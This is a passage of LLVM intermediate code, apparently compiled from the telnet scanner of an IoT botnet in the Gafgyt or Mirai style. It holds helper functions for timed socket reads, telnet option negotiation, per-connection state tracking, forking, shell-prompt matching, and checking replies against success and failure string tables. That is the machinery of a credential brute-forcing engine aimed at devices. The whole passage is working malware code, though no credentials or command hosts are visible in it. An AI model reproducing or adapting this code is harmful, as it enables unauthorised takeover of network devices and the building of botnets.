  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @strcasestr(i8* %23, i8* %28) #10
  %30 = icmp ne i8* %29, null
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

; <label>:32:                                     ; preds = %22
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18

; <label>:36:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

; Function Attrs: nounwind readonly
declare i8* @strcasestr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([9 x i8*], [9 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %20 = load i32, i32* %6, align 4
  %21 = call i32 (i32, i32, ...) @fcntl(i32 %20, i32 3, i8* null)
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %15, align 8
  %23 = load i64, i64* %15, align 8
  %24 = or i64 %23, 2048
  store i64 %24, i64* %15, align 8
  %25 = load i32, i32* %6, align 4
  %26 = load i64, i64* %15, align 8
  %27 = call i32 (i32, i32, ...) @fcntl(i32 %25, i32 4, i64 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = trunc i32 %29 to i16
  %31 = call zeroext i16 @htons(i16 zeroext %30) #13
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %35 = call i32 @getHost(i8* %33, %struct.in_addr* %34)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %104

; <label>:38:                                     ; preds = %4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %43 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  store %struct.sockaddr* %43, %struct.sockaddr** %42, align 8
  %44 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %45 = load %struct.sockaddr*, %struct.sockaddr** %44, align 8
  %46 = call i32 @connect(i32 %41, %struct.sockaddr* %45, i32 16)
  store i32 %46, i32* %16, align 4
  %47 = load i32, i32* %16, align 4
  %48 = icmp slt i32 %47, 0
  br i1 %48, label %49, label %95

; <label>:49:                                     ; preds = %38
  %50 = call i32* @__errno_location() #13
  %51 = load i32, i32* %50, align 4
  %52 = icmp eq i32 %51, 115
  br i1 %52, label %53, label %93

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %9, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %55, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !4
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %18, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %19, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %6, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %73 = load i32, i32* %6, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %6, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %82 = icmp sgt i32 %81, 0
  br i1 %82, label %83, label %91

; <label>:83:                                     ; preds = %67
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %83
  store i32 0, i32* %5, align 4
  br label %104

; <label>:90:                                     ; preds = %83
  br label %92

; <label>:91:                                     ; preds = %67
  store i32 0, i32* %5, align 4
  br label %104

; <label>:92:                                     ; preds = %90
  br label %94

; <label>:93:                                     ; preds = %49
  store i32 0, i32* %5, align 4
  br label %104

; <label>:94:                                     ; preds = %92
  br label %95

; <label>:95:                                     ; preds = %94, %38
  %96 = load i32, i32* %6, align 4
  %97 = call i32 (i32, i32, ...) @fcntl(i32 %96, i32 3, i8* null)
  %98 = sext i32 %97 to i64
  store i64 %98, i64* %15, align 8
  %99 = load i64, i64* %15, align 8
  %100 = and i64 %99, -2049
  store i64 %100, i64* %15, align 8
  %101 = load i32, i32* %6, align 4
  %102 = load i64, i64* %15, align 8
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %101, i32 4, i64 %102)
  store i32 1, i32* %5, align 4
  br label %104

; <label>:104:                                    ; preds = %95, %93, %91, %89, %37
  %105 = load i32, i32* %5, align 4
  ret i32 %105
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp sle i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %48

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @numpids, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* @numpids, align 4
  %13 = load i32, i32* @numpids, align 4
  %14 = add nsw i32 %13, 1
  %15 = mul nsw i32 %14, 4
  %16 = sext i32 %15 to i64
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %19

; <label>:19:                                     ; preds = %34, %10
  %20 = load i32, i32* %4, align 4
  %21 = load i32, i32* @numpids, align 4
  %22 = sub nsw i32 %21, 1
  %23 = icmp slt i32 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %19
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %19

; <label>:37:                                     ; preds = %19
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* @numpids, align 4
  %41 = sub nsw i32 %40, 1
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %39, i64 %42
  store i32 %38, i32* %43, align 4
  %44 = load i32*, i32** @pids, align 8
  %45 = bitcast i32* %44 to i8*
  call void @free(i8* %45) #2
  %46 = load i32*, i32** %3, align 8
  store i32* %46, i32** @pids, align 8
  %47 = load i32, i32* %2, align 4
  store i32 %47, i32* %1, align 4
  br label %48

; <label>:48:                                     ; preds = %37, %8
  %49 = load i32, i32* %1, align 4
  ret i32 %49
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.310, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #2, !srcloc !5
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
